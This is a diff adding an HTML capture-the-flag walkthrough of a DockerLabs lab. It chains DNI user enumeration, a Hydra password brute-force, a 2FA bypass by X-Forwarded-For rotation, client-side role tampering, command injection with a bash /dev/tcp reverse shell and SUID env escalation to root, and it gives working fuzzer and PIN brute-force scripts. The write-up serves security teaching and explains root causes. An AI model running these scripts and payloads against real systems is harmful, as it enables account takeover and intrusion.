+                    </thead>
+                    <tbody>
+                        <tr>
+                            <td>1</td>
+                            <td>User Enumeration (DNI Oracle)</td>
+                            <td>Custom fuzzer.py + registration endpoint</td>
+                            <td>Valid DNI + password brute-force with Hydra</td>
+                        </tr>
+                        <tr>
+                            <td>2</td>
+                            <td>2FA Rate-Limit Bypass</td>
+                            <td>X-Forwarded-For rotation + custom Python script</td>
+                            <td>Full 2FA bypass, authenticated session obtained</td>
+                        </tr>
+                        <tr>
+                            <td>3</td>
+                            <td>Client-Side Role Escalation</td>
+                            <td>Burp Suite match-replace on response body</td>
+                            <td>Application grants admin-level privileges</td>
+                        </tr>
+                        <tr>
+                            <td>4</td>
+                            <td>OS Command Injection + PrivEsc</td>
+                            <td>Reverse shell via /dev/tcp + SUID env binary</td>
+                            <td>Remote code execution as root</td>
+                        </tr>
+                    </tbody>
+                </table>
+
+                <div class="info-box">
+                    <p class="info-box-title">// Key takeaway</p>
+                    <p>
+                        This machine illustrates how <strong>low-severity vulnerabilities in isolation can become
+                            critical when chained together</strong>. A verbose error message, a missing rate-limit
+                        header check, client-side trust, and unvalidated input each seem manageable alone — but
+                        combined they produce a full root compromise.
+                    </p>
+                </div>
+            </div>
+
+            <hr class="divider">
+
+            <!-- ============================================================ SETUP -->
+            <div class="section" id="setup">
+                <p class="section-label">// 02</p>
+                <h2 class="section-title">Setup</h2>
+                <div class="section-line"></div>
+
+                <div class="step-marker">
+                    <div class="step-num">1</div>
+                    <span class="step-title">Deploy the container</span>
+                </div>
+
+                <div class="prose">
+                    <p>
+                        The lab is deployed via the standard DockerLabs helper script, which builds the image
+                        from the <span class="hl">trailpack.tar</span> archive and assigns it an IP on the
+                        internal Docker bridge network (<strong>172.17.0.x</strong>). The
+                        <strong>sudo</strong> prefix is required because the script manages Docker network
+                        interfaces that need elevated privileges.
+                    </p>
+                </div>
+
+                <div class="cmd-block" data-cmd="sudo bash auto_deploy.sh trailpack.tar">
+                    <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+                    <span class="cmd-label">DEPLOY</span>
+                    <div><span class="prompt">$ </span><span class="cmd">sudo bash <span
+                                class="arg">auto_deploy.sh</span> <span class="arg">trailpack.tar</span></span></div>
+                </div>
+
+                <div class="output-block">
+                    <div>Deploying vulnerable machine, please wait.</div>
+                    <div>&nbsp;</div>
+                    <div class="o-ok">Machine deployed, its IP address is ——> <strong>172.17.0.2</strong></div>
+                    <div class="o-bad">Press Ctrl+C when done to remove the machine</div>
+                </div>
+
+                <div class="step-marker">
+                    <div class="step-num">2</div>
+                    <span class="step-title">Create a test account</span>
+                </div>
+
+                <div class="prose">
+                    <p>
+                        Once the container is running, we navigate to <code>http://172.17.0.2:8000/register</code>
+                        and create a test account to explore the application's registration flow and understand what
+                        parameters are sent in each request. This is a standard recon step before any web
+                        application assessment — map the attack surface first.
+                    </p>
+                    <p>
+                        During registration we observe that the form collects a <span class="hl">DNI field</span>
+                        (Spanish national identity number). This immediately raises a question: what happens if
+                        we try to register with a DNI that already belongs to another user?
+                    </p>
+                </div>
+
+                <div class="output-block">
+                    <div><span class="o-accent">Name :</span> fran</div>
+                    <div><span class="o-accent">Email:</span> fran@fran.com</div>
+                    <div><span class="o-accent">DNI :</span> 12312312F</div>
+                    <div><span class="o-accent">Pass :</span> 123123123</div>
+                </div>
+
+                <div class="step-marker">
+                    <div class="step-num">3</div>
+                    <span class="step-title">Configure Burp Suite &amp; FoxyProxy</span>
+                </div>
+
+                <div class="prose">
+                    <p>
+                        Before going further, we route traffic through <strong>Burp Suite</strong> to inspect
+                        raw HTTP requests and responses. In Burp, we go to <em>Target → Scope → Add</em> and
+                        set the prefix to <code>172.17.0.2:8000</code> to scope the proxy to our target.
+                        <strong>FoxyProxy</strong> in the browser is configured to point to Burp's proxy
+                        listener (<code>127.0.0.1:8080</code>).
+                    </p>
+                    <p>
+                        With the proxy active, we make a second registration attempt using the same DNI we
+                        registered with. The application responds with a clear error message, and we intercept
+                        the full HTTP exchange in Burp's <em>HTTP history</em> tab. This reveals the exact
+                        POST body structure we need to build our exploit.
+                    </p>
+                </div>
+
+                <div class="cmd-block" data-cmd="">
+                    <span class="cmd-label">BURP / RAW REQUEST</span>
+                    <div><span class="comment"># POST request intercepted in Burp HTTP history</span></div>
+                    <div>&nbsp;</div>
+                    <div><span class="o-white">POST /register HTTP/1.1</span></div>
+                    <div>Host: <span class="arg">172.17.0.2:8000</span></div>
+                    <div>Content-Type: application/x-www-form-urlencoded</div>
+                    <div>Cookie: csrftoken=EjLf807KTLwPCpe1ywwXLNTQe08SFQfg</div>
+                    <div>&nbsp;</div>
+                    <div><span class="o-ok">name=sad&amp;email=sad%40sad.com&amp;dni=<span
+                                class="o-bad">12312312F</span>&amp;password=asdasdasd</span></div>
+                </div>
+
+                <div class="output-block">
+                    <div><span class="o-bad">Este NIF ya está registrado. ¿Tienes cuenta? Inicia sesión.</span></div>
+                </div>
+
+                <div class="danger-box">
+                    <p class="danger-box-title">// Oracle discovered</p>
+                    <p>
+                        The application leaks a <strong>different error message</strong> when a DNI is already
+                        registered vs. when it is unknown. This behavioural difference creates an
+                        <strong>enumeration oracle</strong>: by iterating over DNI candidates and watching for
+                        this response, we can discover all registered users without any credentials.
+                    </p>
+                </div>
+            </div>
+
+            <hr class="divider">
+
+            <!-- ============================================================ VULN 1 -->
+            <div class="section" id="vuln1">
+                <p class="section-label">// 03</p>
+                <h2 class="section-title">Vulnerability 1 — DNI Oracle &amp; User Enumeration</h2>
+                <div class="section-line"></div>
+
+                <div class="vuln-banner vuln-info">
+                    <div class="vuln-banner-num">01</div>
+                    <div class="vuln-banner-body">
+                        <div class="vuln-banner-tag">Information Disclosure</div>
+                        <div class="vuln-banner-title">Registration endpoint leaks existing user DNIs</div>
+                    </div>
+                </div>
+
+                <div class="prose">
+                    <p>
+                        The registration endpoint behaves as a user-enumeration oracle: it returns a
+                        <strong>distinct response</strong> ("Este NIF ya está registrado") when a supplied DNI
+                        belongs to an existing account. By iterating through a range of valid DNI combinations
+                        and checking for this string, we can enumerate all registered identities without needing
+                        any authentication.
+                    </p>
+                    <p>
+                        DNIs in Spain follow a strict format: <strong>8 digits + 1 letter</strong>, where the
+                        letter is deterministically derived from <code>number % 23</code> against the alphabet
+                        <code>TRWAGMYFPDXBNJZSQVHLCKE</code>. This means the entire space for a given numeric
+                        prefix is fully enumerable. We build a multithreaded Python script to cover the range
+                        <span class="hl">71900000–71999999</span> (100,000 combinations) at high speed.
+                    </p>
+                </div>
+
+                <div class="step-marker">
+                    <div class="step-num">4</div>
+                    <span class="step-title">Run the DNI oracle fuzzer</span>
+                </div>
+
+                <div class="prose">
+                    <p>
+                        The script uses <strong>Python's ThreadPoolExecutor</strong> (40 workers by default)
+                        to fire concurrent registration POST requests. Each request includes a freshly generated
+                        DNI and a throw-away email. When the oracle string appears in the response body, the DNI
+                        is immediately written to <code>discovered_dnis.txt</code>. The approach avoids creating
+                        real accounts — it submits the request but relies on the error appearing before any
+                        account is actually written, since the validation fires first.
+                    </p>
+                </div>
+
+                <div class="cmd-block code-block"
+                    data-cmd="python3 fuzzer.py --url http://172.17.0.2:8000 --threads 40">
+                    <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+                    <span class="cmd-label">fuzzer.py</span>
+                    <div><span class="comment"># DISCLAIMER: PoC for controlled lab environment only — educational
+                            purposes</span></div>
+                    <div>&nbsp;</div>
+                    <div><span class="kw">import</span> argparse, http.client, urllib.parse, threading</div>
+                    <div><span class="kw">from</span> concurrent.futures <span class="kw">import</span>
+                        ThreadPoolExecutor</div>
+                    <div>&nbsp;</div>
+                    <div>ORACLE = <span class="str">"Este NIF ya está registrado. ¿Tienes cuenta? Inicia sesión."</span>
+                    </div>
+                    <div>&nbsp;</div>
+                    <div><span class="kw">def</span> <span class="o-ok">calculate_dni</span>(n):</div>
+                    <div> letters = <span class="str">"TRWAGMYFPDXBNJZSQVHLCKE"</span></div>
+                    <div> <span class="kw">return</span> f<span class="str">"{n:08d}"</span> + letters[n % <span
+                            class="num">23</span>]</div>
+                    <div>&nbsp;</div>
+                    <div><span class="kw">def</span> <span class="o-ok">probe</span>(host, port, number, found, lock):
+                    </div>
+                    <div> dni = calculate_dni(number)</div>
+                    <div> params = urllib.parse.urlencode({</div>
+                    <div> <span class="str">"name"</span>: <span class="str">"luis"</span>, <span
+                            class="str">"email"</span>: f<span class="str">"test_{number}@trailpack.lab"</span>,</div>
+                    <div> <span class="str">"dni"</span>: dni, <span class="str">"password"</span>: <span
+                            class="str">"Password123!"</span>, <span class="str">"terms"</span>: <span
+                            class="str">"on"</span></div>
+                    <div> })</div>
+                    <div> conn = http.client.HTTPConnection(host, port, timeout=<span class="num">10</span>)</div>
+                    <div> conn.request(<span class="str">"POST"</span>, <span class="str">"/register"</span>,
+                        body=params,</div>
+                    <div> headers={<span class="str">"Content-Type"</span>: <span
+                            class="str">"application/x-www-form-urlencoded"</span>})</div>
+                    <div> resp = conn.getresponse()</div>
+                    <div> <span class="kw">if</span> ORACLE <span class="kw">in</span> resp.read().decode(errors=<span
+                            class="str">"ignore"</span>):</div>
+                    <div> <span class="kw">with</span> lock:</div>
+                    <div> found.append(dni)</div>
+                    <div> <span class="kw">print</span>(f<span class="str">"[+] DNI FOUND: {dni}"</span>)</div>
+                    <div>&nbsp;</div>
+                    <div><span class="comment"># Run: python3 fuzzer.py --url http://172.17.0.2:8000 --threads 40</span>
+                    </div>
+                </div>
+
+                <div class="output-block">
+                    <div><span class="o-accent">[*]</span> Target: <span class="o-white">172.17.0.2:8000</span></div>
+                    <div><span class="o-accent">[*]</span> Searching DNIs with prefix 719 (100,000 candidates)</div>
+                    <div><span class="o-accent">[>]</span> Progress: 12.50% (12500/100000)</div>
+                    <div><span class="o-accent">[>]</span> Progress: 37.80% (37800/100000)</div>
+                    <div>&nbsp;</div>
+                    <div><span class="o-ok">[+] DNI FOUND: <strong>71934581K</strong></span> </div>
+                    <div><span class="o-ok">[+] DNI FOUND: <strong>71960227N</strong></span> </div>
+                    <div>&nbsp;</div>
+                    <div><span class="o-accent">[*]</span> Attack finished. Total found: <span class="o-ok">2</span>
+                    </div>
+                </div>
+
+                <div class="step-marker">
+                    <div class="step-num">5</div>
+                    <span class="step-title">Brute-force the password — Hydra</span>
+                </div>
+
+                <div class="prose">
+                    <p>
+                        With two valid DNIs in hand, we use <strong>Hydra</strong> to brute-force the login
+                        endpoint with the <code>rockyou.txt</code> wordlist. The login form at
+                        <code>/login</code> accepts <code>dni</code> and <code>password</code> as POST fields
+                        and returns <em>"NIF/DNI o contraseña no válidos."</em> on failure, which we specify
+                        as Hydra's failure condition. We target <span class="hl">71960227N</span> first.
+                    </p>
+                </div>
+
+                <div class="cmd-block"
+                    data-cmd='hydra -l 71960227N -P /usr/share/wordlists/rockyou.txt.gz -s 8000 172.17.0.2 http-post-form "/login:dni=^USER^&password=^PASS^:F=NIF/DNI o contraseña no válidos." -V'>
+                    <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+                    <span class="cmd-label">HYDRA</span>
+                    <div><span class="prompt">$ </span><span class="cmd">hydra <span class="flag">-l</span> <span
+                                class="arg">71960227N</span> <span class="flag">-P</span> <span
+                                class="arg">/usr/share/wordlists/rockyou.txt.gz</span> <span class="flag">-s</span>
+                            <span class="num">8000</span> <span class="arg">172.17.0.2</span> http-post-form <span
+                                class="str">"/login:dni=^USER^&amp;password=^PASS^:F=NIF/DNI o contraseña no
+                                válidos."</span> <span class="flag">-V</span></span></div>
+                </div>
+
+                <div class="output-block">
+                    <div>Hydra v9.5 (c) 2023 by van Hauser/THC &amp; David Maciejak</div>
+                    <div>&nbsp;</div>
+                    <div>[DATA] attacking http-post-form://172.17.0.2:8000/login</div>
+                    <div>[ATTEMPT] target 172.17.0.2 — login: 71960227N — pass: 123456</div>
+                    <div>[ATTEMPT] target 172.17.0.2 — login: 71960227N — pass: password</div>
+                    <div>[ATTEMPT] target 172.17.0.2 — login: 71960227N — pass: chocolate</div>
+                    <div>&nbsp;</div>
+                    <div><span class="o-ok">[8000][http-post-form] host: 172.17.0.2 login: <strong>71960227N</strong>
+                            password: <strong>chocolate</strong></span></div>
+                    <div>1 of 1 target successfully completed, 1 valid password found</div>
+                </div>
+
+                <div class="ok-box">
+                    <p class="ok-box-title">// Credential obtained</p>
+                    <p>
+                        Valid credential pair confirmed: <strong>71960227N / chocolate</strong>. However,
+                        logging in with these credentials triggers a <strong>Two-Factor Authentication</strong>
+                        step — the system sends (or displays) a 4-digit PIN that must be entered to complete
+                        authentication. With only 2–3 attempts allowed, direct brute-force is not viable.
+                        We need to bypass the rate limit first.
+                    </p>
+                </div>
+            </div>
+
+            <hr class="divider">
+
+            <!-- ============================================================ VULN 2 -->
+            <div class="section" id="vuln2">
+                <p class="section-label">// 04</p>
+                <h2 class="section-title">Vulnerability 2 — 2FA Rate-Limit Bypass via X-Forwarded-For</h2>
+                <div class="section-line"></div>
+
+                <div class="vuln-banner vuln-warn">
+                    <div class="vuln-banner-num">02</div>
+                    <div class="vuln-banner-body">
+                        <div class="vuln-banner-tag">Authentication Bypass</div>
+                        <div class="vuln-banner-title">2FA attempt counter is tracked per IP, not per session</div>
+                    </div>
+                </div>
+
+                <div class="prose">
+                    <p>
+                        After submitting valid credentials, the application redirects to
+                        <code>/verify-mfa</code> and requires a 4-digit PIN. The server enforces a limit of
+                        <strong>2–3 incorrect attempts</strong> before blocking further submissions. At first
+                        glance this seems to make brute-forcing the 10,000 possible PINs infeasible.
+                    </p>
+                    <p>
+                        However, the rate-limit implementation has a critical flaw: it tracks failed attempts
+                        by the <strong>client IP address</strong> taken from the
+                        <span class="hl-bad">X-Forwarded-For</span> header — without any validation. This header
+                        is freely settable by any HTTP client, meaning we can impersonate a different IP on every
+                        single request. The lockout counter resets because each request appears to come from a
+                        new origin, giving us unlimited attempts distributed across the full PIN space.
+                    </p>
+                </div>
+
+                <div class="step-marker">
+                    <div class="step-num">6</div>
+                    <span class="step-title">Intercept the MFA request in Burp</span>
+                </div>
+
+                <div class="prose">
+                    <p>
+                        We log in with the cracked credentials, intercept the <code>POST /verify-mfa</code>
+                        request in Burp Suite, and send it to the <em>Repeater</em>. Crucially, we note the
+                        active <code>session_id</code> cookie — this must remain constant across all our
+                        brute-force attempts so the server associates each PIN attempt with our authenticated
+                        session context. We manually add the <code>X-Forwarded-For</code> header and confirm
+                        the bypass logic works by trying two wrong PINs without getting locked out.
+                    </p>
+                </div>
+
+                <div class="cmd-block" data-cmd="">
+                    <span class="cmd-label">BURP / MODIFIED REQUEST</span>
+                    <div><span class="o-white">POST /verify-mfa HTTP/1.1</span></div>
+                    <div>Host: 172.17.0.2:8000</div>
+                    <div>Content-Type: application/x-www-form-urlencoded</div>
+                    <div><span class="o-ok">X-Forwarded-For: <span class="arg">10.10.10.11</span></span> <span
+                            class="comment">&lt;— spoofed origin IP (changes each request)</span></div>
+                    <div>Cookie: session_id=<span
+                            class="arg">7bb2b01821a202aa1138bf8131a79b4f6d0bd4e4a9cc953b7095b858c3a56079</span></div>
+                    <div>&nbsp;</div>
+                    <div>pin=<span class="arg">1111</span></div>
+                </div>
+
+                <div class="step-marker">
+                    <div class="step-num">7</div>
+                    <span class="step-title">Automate the PIN brute-force with XFF rotation</span>
+                </div>
+
+                <div class="prose">
+                    <p>
+                        We write a Python script that iterates over all <strong>10,000 possible PINs</strong>
+                        (<code>0000</code> to <code>9999</code>), injecting a randomly generated IPv4 address
+                        in the <code>X-Forwarded-For</code> header on every request. The script uses a
+                        persistent <code>requests.Session</code> to keep the <code>session_id</code> cookie
+                        fixed, and detects a successful PIN by the <strong>absence</strong> of the failure
+                        string <em>"Código incorrecto"</em> in the response body.
+                    </p>
+                    <p>
+                        Before running, replace the <code>SESSION_ID</code> constant with the value copied
+                        from your own intercepted request, as session tokens are unique per login.
+                    </p>
+                </div>
+
+                <div class="cmd-block code-block" data-cmd="python3 mfa_bypass.py">
+                    <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+                    <span class="cmd-label">mfa_bypass.py</span>
+                    <div><span class="kw">import</span> requests, random</div>
+                    <div>&nbsp;</div>
+                    <div>TARGET = <span class="str">"http://172.17.0.2:8000/verify-mfa"</span></div>
+                    <div>SESSION = <span class="str">"&lt;paste_your_session_id_here&gt;"</span> <span class="comment">#
+                            from intercepted cookie</span></div>
+                    <div>&nbsp;</div>
+                    <div><span class="kw">def</span> <span class="o-ok">random_ip</span>():</div>
+                    <div> <span class="kw">return</span> <span class="str">"."</span>.join(<span
+                            class="kw">str</span>(random.randint(<span class="num">1</span>,<span
+                            class="num">254</span>)) <span class="kw">for</span> _ <span class="kw">in</span>
+                        range(<span class="num">4</span>))</div>
+                    <div>&nbsp;</div>
+                    <div>session = requests.Session()</div>
+                    <div>session.cookies.set(<span class="str">"session_id"</span>, SESSION)</div>
+                    <div>&nbsp;</div>
+                    <div><span class="kw">for</span> i <span class="kw">in</span> range(<span class="num">10000</span>):
+                    </div>
+                    <div> pin = f<span class="str">"{i:04d}"</span></div>
+                    <div> resp = session.post(TARGET, allow_redirects=<span class="kw">False</span>,</div>
+                    <div> headers={<span class="str">"X-Forwarded-For"</span>: random_ip(),</div>
+                    <div> <span class="str">"Content-Type"</span>: <span
+                            class="str">"application/x-www-form-urlencoded"</span>},</div>
+                    <div> data={<span class="str">"pin"</span>: pin})</div>
+                    <div> <span class="kw">if</span> <span class="str">"Código incorrecto"</span> <span class="kw">not
+                            in</span> resp.text:</div>
+                    <div> <span class="kw">print</span>(f<span class="str">"\n[+] PIN FOUND: {pin}"</span>); <span
+                            class="kw">break</span></div>
+                    <div> <span class="kw">print</span>(f<span class="str">"[*] Trying {pin}"</span>, end=<span
+                            class="str">"\r"</span>)</div>
+                </div>
+
+                <div class="output-block">
+                    <div><span class="o-accent">[*]</span> Initiating XFF-rotation attack on /verify-mfa ...</div>
+                    <div><span class="o-accent">[*]</span> Trying 0000</div>
+                    <div><span class="o-accent">[*]</span> Trying 0001</div>
+                    <div>...</div>
+                    <div>&nbsp;</div>
+                    <div><span class="o-ok">[+] PIN FOUND: <strong>4821</strong></span></div>
+                </div>
+
+                <div class="warn-box">
+                    <p class="warn-box-title">// Root cause</p>
+                    <p>
+                        The server trusts the <strong>X-Forwarded-For</strong> header to determine the
+                        client's real IP address but never validates or sanitises it. Rate-limiting decisions
+                        should always be based on the <strong>connection-level TCP source IP</strong> or a
+                        cryptographically signed session identifier — never a header that any client can freely
+                        forge.
+                    </p>
+                </div>
+            </div>
+
+            <hr class="divider">
+
+            <!-- ============================================================ VULN 3 -->
+            <div class="section" id="vuln3">
+                <p class="section-label">// 05</p>
+                <h2 class="section-title">Vulnerability 3 — Client-Side Role Escalation</h2>
+                <div class="section-line"></div>
+
+                <div class="vuln-banner vuln-purple">
+                    <div class="vuln-banner-num">03</div>
+                    <div class="vuln-banner-body">
+                        <div class="vuln-banner-tag">Broken Access Control</div>
+                        <div class="vuln-banner-title">Server trusts a client-supplied role value in the response</div>
+                    </div>
+                </div>
+
+                <div class="prose">
+                    <p>
+                        After successfully passing 2FA, we are logged in to the dashboard as a regular user.
+                        Monitoring Burp's HTTP history, we notice that the dashboard makes an API call to
+                        <code>GET /api/me</code> to retrieve our profile information. The response contains a
+                        JSON object including a <span class="hl-bad"><code>"role"</code></span> field.
+                    </p>
+                    <p>
+                        Inspecting the <code>user_info</code> cookie reveals a
+                        <strong>Base64-encoded JSON payload</strong> — a classic sign of client-side trust.
+                        Decoding it reveals: <code>{"user": "Carlos Mendoza", "role": "user", "email": "..."}</code>.
+                        More critically, the application appears to rely on the <code>role</code> value returned
+                        in the API response body (and/or the cookie) to make access-control decisions on the
+                        client side, without a robust server-side re-check on every admin-restricted endpoint.
+                    </p>
+                </div>
+
+                <div class="step-marker">
+                    <div class="step-num">8</div>
+                    <span class="step-title">Observe the /api/me response</span>
+                </div>
+
+                <div class="cmd-block" data-cmd="">
+                    <span class="cmd-label">BURP / /api/me RESPONSE</span>
+                    <div><span class="o-white">GET /api/me HTTP/1.1</span></div>
+                    <div>Host: 172.17.0.2:8000</div>
+                    <div>Cookie: session_id=<span class="arg">37e0223033949ea3af86b8a0247ec4cf95fc62ef...</span></div>
+                    <div> user_info=<span class="arg">eyJ1c2VyIjogIkNhcmxvcyBNZW5kb3phI...</span> <span
+                            class="comment">&lt;— base64 JSON</span></div>
+                    <div>&nbsp;</div>
+                    <div><span class="comment">--- Response ---</span></div>
+                    <div>HTTP/1.1 <span class="o-ok">200 OK</span></div>
+                    <div>&nbsp;</div>
+                    <div>{"user":"Carlos Mendoza","<span class="o-bad">role</span>":"<span
+                            class="o-bad">user</span>","email":"carlos.mendoza@trailpack.es"}</div>
+                </div>
+
+                <div class="step-marker">
+                    <div class="step-num">9</div>
+                    <span class="step-title">Apply Burp Suite match-replace rule</span>
+                </div>
+
+                <div class="prose">
+                    <p>
+                        We configure a <strong>Burp Suite Proxy match-and-replace rule</strong> that
+                        transparently rewrites every response passing through the proxy before it reaches
+                        the browser. The rule targets the <em>response body</em> and replaces the string
+                        <code>"role":"user"</code> with <code>"role":"admin"</code>.
+                    </p>
+                    <p>
+                        In Burp: <em>Proxy → Settings → Match and Replace → Add</em>. Set type to
+                        <strong>Response body</strong>, match: <code>"role":"user"</code>, replace:
+                        <code>"role":"admin"</code>. After saving, we hard-refresh the dashboard. The
+                        browser now receives the modified response, interprets us as an admin, and
+                        renders the full administration panel — including the review management section
+                        that will become our next attack surface.
+                    </p>
+                </div>
+
+                <div class="output-block">
+                    <div><span class="comment"># Burp match-replace rule</span></div>
+                    <div>Type : <span class="o-accent">Response body</span></div>
+                    <div>Match : <span class="o-bad">"role":"user"</span></div>
+                    <div>Replace: <span class="o-ok">"role":"admin"</span></div>
+                    <div>&nbsp;</div>
+                    <div><span class="comment"># Modified /api/me response after rule is active</span></div>
+                    <div>{"user":"Carlos Mendoza","<span class="o-ok">role</span>":"<span
+                            class="o-ok">admin</span>","email":"carlos.mendoza@trailpack.es"}</div>
+                    <div>&nbsp;</div>
+                    <div><span class="o-ok">[✓] Admin panel now accessible in the browser</span></div>
+                </div>
+
+                <div class="warn-box">
+                    <p class="warn-box-title">// Root cause</p>
+                    <p>
+                        Authorization decisions must <strong>always</strong> be enforced server-side on every
+                        request using a trusted, tamper-proof session identifier — never based on a value
+                        returned to (and therefore controllable by) the client. Sending role information in
+                        a plain response body or an unsigned cookie violates the principle of
+                        <strong>server-side access control</strong>.
+                    </p>
+                </div>
+            </div>
+
+            <hr class="divider">
+
+            <!-- ============================================================ VULN 4 -->
+            <div class="section" id="vuln4">
+                <p class="section-label">// 06</p>
+                <h2 class="section-title">Vulnerability 4 — Command Injection &amp; Privilege Escalation</h2>
+                <div class="section-line"></div>
+
+                <div class="vuln-banner vuln-danger">
+                    <div class="vuln-banner-num">04</div>
+                    <div class="vuln-banner-body">
+                        <div class="vuln-banner-tag">OS Command Injection + SUID PrivEsc</div>
+                        <div class="vuln-banner-title">Review field executes unsanitised shell input → root shell via
+                            env SUID</div>
+                    </div>
+                </div>
+
+                <div class="prose">
+                    <p>
+                        With admin access to the dashboard, we investigate all available input fields for
+                        injection vulnerabilities. The <strong>review submission panel</strong> accepts a
+                        numeric rating field. Testing it with standard payloads reveals that the application
+                        passes the field value directly to a shell command without any sanitisation or input
+                        validation. Submitting <code>1; whoami</code> executes <code>whoami</code> and reflects
+                        the output back, confirming <span class="hl-bad">OS command injection</span>.
+                    </p>
+                </div>
+
+                <div class="step-marker">
+                    <div class="step-num">10</div>
+                    <span class="step-title">Confirm command injection</span>
+                </div>
+
+                <div class="cmd-block" data-cmd="">
+                    <span class="cmd-label">INJECTION PROOF</span>
+                    <div><span class="comment"># Input submitted in the review rating field:</span></div>
+                    <div>1<span class="o-bad">; whoami</span></div>
+                    <div>&nbsp;</div>
+                    <div><span class="comment"># Response reflects command output:</span></div>
+                    <div><span class="o-ok">balutron</span></div>
+                </div>
+
+                <div class="step-marker">
+                    <div class="step-num">11</div>
+                    <span class="step-title">Write reverse shell script to disk</span>
+                </div>
+
+                <div class="prose">
+                    <p>
+                        We use the injection to write a reverse shell one-liner to disk. The
+                        <code>echo</code> command writes a Bash reverse shell to <code>exploit.sh</code>
+                        on the server's filesystem. The payload uses <strong>/dev/tcp</strong>, a Bash
+                        built-in that opens a TCP connection, redirecting stdin/stdout/stderr to our listener.
+                        Before triggering the shell, we start a <code>netcat</code> listener on our attacker
+                        machine on port <code>666</code>.
+                    </p>
+                </div>
+
+                <div class="cmd-block" data-cmd="sudo nc -nlvp 666">
+                    <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+                    <span class="cmd-label">ATTACKER — LISTENER</span>
+                    <div><span class="prompt">$ </span><span class="cmd">sudo nc <span class="flag">-nlvp</span> <span
+                                class="num">666</span></span></div>
+                    <div><span class="comment"># listening on [any] 666 ...</span></div>
+                </div>
+
+                <div class="cmd-block" data-cmd="">
+                    <span class="cmd-label">INJECTION — WRITE PAYLOAD</span>
+                    <div><span class="comment"># Injected into the review rating field (step 1 — write to disk):</span>
+                    </div>
+                    <div>1<span class="o-bad">; echo 'bash -i &gt;&amp; /dev/tcp/10.0.2.15/666 0&gt;&amp;1' &gt;
+                            exploit.sh</span></div>
+                    <div>&nbsp;</div>
+                    <div><span class="comment"># Injected into the review rating field (step 2 — execute):</span></div>
+                    <div>1<span class="o-bad">; bash exploit.sh</span></div>
+                </div>
+
+                <div class="output-block">
+                    <div>listening on [any] 666 ...</div>
+                    <div><span class="o-ok">connect to [10.0.2.15] from (UNKNOWN) [172.17.0.2] 40904</span></div>
+                    <div>bash: cannot set terminal process group (1): Inappropriate ioctl for device</div>
+                    <div>bash: no job control in this shell</div>
+                    <div><span class="o-warn">balutron@c4c27dc4e37b:/app$</span></div>
+                </div>
+
+                <div class="info-box">
+                    <p class="info-box-title">// Shell stabilisation tip</p>
+                    <p>
+                        The received shell is a raw, non-interactive TTY. To stabilise it and enable
+                        features like <strong>tab completion</strong>, <strong>Ctrl+C</strong> passthrough,
+                        and clear screen, spawn a proper TTY with:
+                        <code>python3 -c 'import pty; pty.spawn("/bin/bash")'</code>
+                        then background with Ctrl+Z, run <code>stty raw -echo; fg</code>, and set
+                        <code>export TERM=xterm</code>.
+                    </p>
+                </div>
+
+                <div class="step-marker">
+                    <div class="step-num">12</div>
+                    <span class="step-title">Privilege escalation — SUID binary</span>
+                </div>
+
+                <div class="prose">
+                    <p>
+                        We are inside the container as user <code>balutron</code>. To escalate to
+                        <code>root</code>, we enumerate <strong>SUID binaries</strong> — executables
+                        that run with the file owner's privileges (typically root) regardless of who
+                        invokes them. The <code>find</code> command below searches the entire filesystem
+                        for any file with the SUID bit set.
+                    </p>
+                </div>
+
+                <div class="cmd-block" data-cmd="find / -perm -4000 2>/dev/null">
+                    <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+                    <span class="cmd-label">PRIVESC — FIND SUID</span>
+                    <div><span class="prompt">balutron@c4c27dc4e37b:/app$ </span><span class="cmd">find / <span
+                                class="flag">-perm</span> <span class="arg">-4000</span> <span
+                                class="num">2</span>&gt;/dev/null</span></div>
+                </div>
+
+                <div class="output-block">
+                    <div>/usr/bin/su</div>
+                    <div>/usr/bin/passwd</div>
+                    <div>/usr/bin/chsh</div>
+                    <div><span class="o-ok">/usr/bin/env</span> <span class="comment">&lt;— SUID set on env — critical
+                            finding</span></div>
+                    <div>/usr/bin/mount</div>
+                    <div>/usr/bin/umount</div>
+                </div>
+
+                <div class="prose">
+                    <p>
+                        <strong><code>/usr/bin/env</code></strong> has the SUID bit set. The
+                        <code>env</code> binary is used to run commands in a modified environment, and
+                        the <span class="hl-pur">-p</span> flag to <code>/bin/sh</code> instructs the shell
+                        to <strong>preserve the effective UID</strong> rather than dropping privileges. Since
+                        <code>env</code> runs as root due to SUID, the spawned shell inherits root's effective
+                        UID — granting us a full root shell.
+                    </p>
+                </div>
+
+                <div class="cmd-block" data-cmd="env /bin/sh -p">
+                    <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+                    <span class="cmd-label">PRIVESC — SUID env</span>
+                    <div><span class="prompt">balutron@c4c27dc4e37b:/app$ </span><span class="cmd">env /bin/sh <span
+                                class="flag">-p</span></span></div>
+                </div>
+
+                <div class="output-block">
+                    <div><span class="prompt">$ </span>whoami</div>
+                    <div><span class="o-ok"><strong>root</strong></span></div>
+                    <div><span class="prompt">$ </span>id</div>
+                    <div><span class="o-ok">uid=0(root) gid=1000(balutron) groups=1000(balutron)</span></div>
+                    <div><span class="prompt"># </span>&nbsp;</div>
+                </div>
+
+                <div class="ok-box">
+                    <p class="ok-box-title">// Root obtained ✓</p>
+                    <p>
+                        Full root access achieved. The chain is complete: <strong>DNI enumeration →
+                            credential brute-force → 2FA bypass → role escalation → command injection →
+                            SUID privilege escalation</strong>. Four vulnerabilities, one fully compromised
+                        container running as root.
+                    </p>
+                </div>
+
+                <div class="danger-box">
+                    <p class="danger-box-title">// Root cause</p>
+                    <p>
+                        The <code>env</code> binary should <strong>never</strong> have the SUID bit set
+                        in a production or containerised environment. Any binary listed on
+                        <strong>GTFOBins</strong> with a SUID entry represents an immediate privilege
+                        escalation path when misconfigured. Combined with the command injection that
+                        delivered our initial shell, this makes the final escalation trivial.
+                    </p>
+                </div>
+            </div>
+
+            <hr class="divider">
+
+            <!-- ============================================================ TOOL REFERENCE -->
+            <div class="section" id="cmdref">
+                <p class="section-label">// 07</p>
+                <h2 class="section-title">Tool Reference</h2>
+                <div class="section-line"></div>
+
+                <div class="cmd-ref-grid">
+
+                    <div class="cmd-ref-card">
+                        <div class="cmd-ref-name">Burp Suite</div>
+                        <div class="cmd-ref-syntax">Proxy → Match and Replace</div>
